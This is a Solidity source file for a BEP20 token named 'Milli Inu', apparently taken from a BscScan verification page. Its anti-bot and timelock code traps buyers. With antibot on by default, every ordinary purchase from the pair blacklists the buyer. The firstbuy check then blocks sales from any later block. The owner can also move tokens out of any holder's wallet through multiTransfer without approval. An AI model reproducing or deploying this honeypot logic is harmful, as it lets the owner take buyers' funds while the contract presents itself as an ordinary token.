/**
 *Submitted for verification at BscScan.com on 2022-08-17
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        require(adr != owner, "OWNER cant be unauthorized");
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr, uint256 confirm) public onlyOwner {
        require(confirm == 911911911,"Accidental Press"); // just paranoid
        require(adr != owner, "Already the owner");
        authorizations[owner] = false;
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MilliInu is IBEP20, Auth {
    using SafeMath for uint256;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Milli Inu";
    string constant _symbol = "MINU";
    uint8 constant _decimals = 2;

    uint256 _totalSupply = 100 * 10**6 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply / 100;
    uint256 public _minTxAmount = 0;
    uint256 public _maxWalletToken = _totalSupply / 100;

    mapping (address => uint256) _balances;

    mapping (address => mapping (address => uint256)) _allowances;

    bool public blacklistMode = true;
    bool public timelockMode = true;
    mapping (address => bool) public isBlacklisted;

    bool public antibot = true;
    bool public secondantibot = true;
    

    mapping (address => uint) public firstbuy;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isWalletLimitExempt;

    uint256 liquidityFee = 1;
    uint256 rewardFee = 0;
    uint256 marketingFee = 5;
    uint256 teamFee = 4;
    uint256 devFee = 0;
    uint256 stakingFee = 0;
    uint256 public totalFee = marketingFee + liquidityFee + teamFee + stakingFee + devFee + rewardFee;
    uint256 public constant feeDenominator = 100;

    uint256 sellMultiplier = 330;
    uint256 buyMultiplier = 100;
    uint256 transferMultiplier = 330;

    address autoLiquidityReceiver;
    address marketingFeeReceiver;
    address teamFeeReceiver;
    address stakingFeeReceiver;
    address devFeeReceiver;
    address public rewardDistributor;

    uint256 targetLiquidity = 100;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;

    bool public tradingOpen = false;
    bool public launchMode = true;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 2 / 500;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = 0x6F60cb4383782F97Ee2A87D30Ae0C7Fd8Aa7F29b;
        teamFeeReceiver = 0x6D1E929618B6Bf91899D8c2C7D5C5FFEdd432c08;
        devFeeReceiver = 0x6D1E929618B6Bf91899D8c2C7D5C5FFEdd432c08;
        stakingFeeReceiver = 0x6D1E929618B6Bf91899D8c2C7D5C5FFEdd432c08;
        rewardDistributor = msg.sender;

        isFeeExempt[msg.sender] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[ZERO] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[DEAD] = true;
        isWalletLimitExempt[stakingFeeReceiver] = true;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 1,"Cannot set max wallet less than 0.1%");
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;
    }
    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner {
        require(maxTXPercentage_base1000 >= 1,"Cannot set max transaction less than 0.1%");
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000 ) / 1000;
    }

    function setTxLimit_max(uint256 amount) external authorized {
        require(amount >= (_totalSupply/1000),"Cannot set max transaction less than 0.1%");
        _maxTxAmount = amount;
    }

    function setTxLimit_min(uint256 amount) external authorized {
        require(amount < (_maxTxAmount/2),"Cannot set min transaction more than 50% of max txn");
        _minTxAmount = amount;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
            if(sender == pair){
                if(antibot){
                    isBlacklisted[recipient] = true;
                    isDividendExempt[recipient] = true;
                } else if(secondantibot && (firstbuy[recipient] == 0)){
                    firstbuy[recipient] = block.number;
                    isDividendExempt[recipient] = true;
                }
            }
        }

        // Blacklist
        if(blacklistMode){
            require(!isBlacklisted[sender],"Blacklisted");    
        }

        if(timelockMode && sender != pair){
            if(firstbuy[sender] > 0){
                require( firstbuy[sender] > (block.number - 0), "Bought before contract was launched");    
            }
        }

        if (!authorizations[sender] && !isWalletLimitExempt[sender] && !isWalletLimitExempt[recipient] && recipient != pair) {
            require((balanceOf(recipient) + amount) <= _maxWalletToken,"max wallet limit reached");
        }
    
        // Checks max transaction limit
        require((amount <= _maxTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "Max TX Limit Exceeded");
        require((amount >= _minTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "Min TX Limit Exceeded");


        if(shouldSwapBack()){ swapBack(); }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);

        _balances[recipient] = _balances[recipient].add(amountReceived);


        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {

        uint256 multiplier = transferMultiplier;

        if(recipient == pair) {
            multiplier = sellMultiplier;
        } else if(sender == pair) {
            multiplier = buyMultiplier;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);

        uint256 stakingTokens = feeAmount.mul(stakingFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(stakingTokens);

        if(contractTokens > 0){
            _balances[address(this)] = _balances[address(this)].add(contractTokens);
            emit Transfer(sender, address(this), contractTokens);
        } 

        if(stakingTokens > 0){
            _balances[stakingFeeReceiver] = _balances[stakingFeeReceiver].add(stakingTokens);
            emit Transfer(sender, stakingFeeReceiver, stakingTokens);    
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
    }

    function clearStuckToken(address tokenAddress, uint256 tokens) external onlyOwner returns (bool success) {
        if(tokens == 0){
            tokens = IBEP20(tokenAddress).balanceOf(address(this));
        }
        return IBEP20(tokenAddress).transfer(msg.sender, tokens);
    }

    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external authorized {
        sellMultiplier = _sell;
        buyMultiplier = _buy;
        transferMultiplier = _trans;

        require(totalFee.mul(buyMultiplier).div(100) < 33, "Tax cannot be more than 32%");
        require(totalFee.mul(sellMultiplier).div(100) < 33, "Tax cannot be more than 32%");
    }

    // switch Trading
    function tradingStatus(bool _status, bool a1, bool a2) external onlyOwner {
        if(!_status){
            require(launchMode,"Cannot stop trading after launch is done");
        }
        tradingOpen = _status;
        antibot = a1;
        secondantibot = a2;
    }

    function tradingStatus_launchmode(uint256 confirm) external onlyOwner {
        require(confirm == 911,"Accidental Press"); // just paranoid
        require(tradingOpen,"Cant close launch mode when trading is disabled");
        require(!antibot,"Antibot must be disabled before launch mode is disabled");
        launchMode = false;
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = liquidityFee;
        if(balanceOf(pair).mul(targetLiquidityDenominator).div(getCirculatingSupply()) > targetLiquidity ){
            dynamicLiquidityFee = 0;
        }
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
        uint256 amountBNBteam = amountBNB.mul(teamFee).div(totalBNBFee);
        uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);
        uint256 amountBNBReward = amountBNB.mul(rewardFee).div(totalBNBFee);

        payable(marketingFeeReceiver).transfer(amountBNBMarketing);
        payable(teamFeeReceiver).transfer(amountBNBteam);
        payable(devFeeReceiver).transfer(amountBNBDev);
        payable(rewardDistributor).transfer(amountBNBReward);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }


    function manage_blacklist_status(bool _status) external onlyOwner {
        if(_status){
            require(launchMode,"Cannot turn on blacklistMode after launch is done");
        }
        blacklistMode = _status;
    }

    function manage_timelock_status(bool _status) external onlyOwner {
        if(_status){
            require(launchMode,"Cannot turn on blacklistMode after launch is done");
        }
        timelockMode = _status;
    }
    

    function manage_blacklist(address[] calldata addresses, bool status) external onlyOwner {
        require(addresses.length < 201,"GAS Error: max limit is 200 addresses");
        if(status){
            require(launchMode,"Cannot manually blacklist after launch");
        }

        for (uint256 i; i < addresses.length; ++i) {
            isBlacklisted[addresses[i]] = status;
        }
    }

    function manage_firstbuy(address[] calldata addresses, uint _buytime) external onlyOwner {
        require(addresses.length < 201,"GAS Error: max limit is 200 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            firstbuy[addresses[i]] = _buytime;
        }
    }

    function manage_FeeExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isFeeExempt[addresses[i]] = status;
        }
    }

    function manage_TxLimitExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isTxLimitExempt[addresses[i]] = status;
        }
    }

    function manage_WalletLimitExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isWalletLimitExempt[addresses[i]] = status;
        }
    }

    function manage_DividendExempt(address[] calldata addresses, bool status) external authorized {
        require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
        for (uint256 i; i < addresses.length; ++i) {
            isDividendExempt[addresses[i]] = status;
        }
    }

    function setFees(uint256 _liquidityFee,  uint256 _marketingFee, uint256 _teamFee, uint256 _stakingFee, uint256 _devFee, uint256 _rewardFee) external onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        teamFee = _teamFee;
        devFee = _devFee;
        stakingFee = _stakingFee;
        rewardFee = _rewardFee;
        totalFee = _liquidityFee + _marketingFee + _teamFee + _stakingFee + _devFee + _rewardFee;
        
        require(totalFee.mul(buyMultiplier).div(100) < 33, "Tax cannot be more than 32%");
        require(totalFee.mul(sellMultiplier).div(100) < 33, "Tax cannot be more than 32%");

    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _teamFeeReceiver, address _stakingFeeReceiver, address _devFeeReceiver, address _rewardDistributor) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        teamFeeReceiver = _teamFeeReceiver;
        stakingFeeReceiver = _stakingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
        rewardDistributor = _rewardDistributor;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external onlyOwner {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }


function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    require(launchMode,"Cannot execute this after launch is done");

    require(addresses.length < 501,"GAS Error: max airdrop limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between Address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }

    require(balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    for(uint i=0; i < addresses.length; i++){
        _basicTransfer(from,addresses[i],tokens[i]);
    }

}

event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}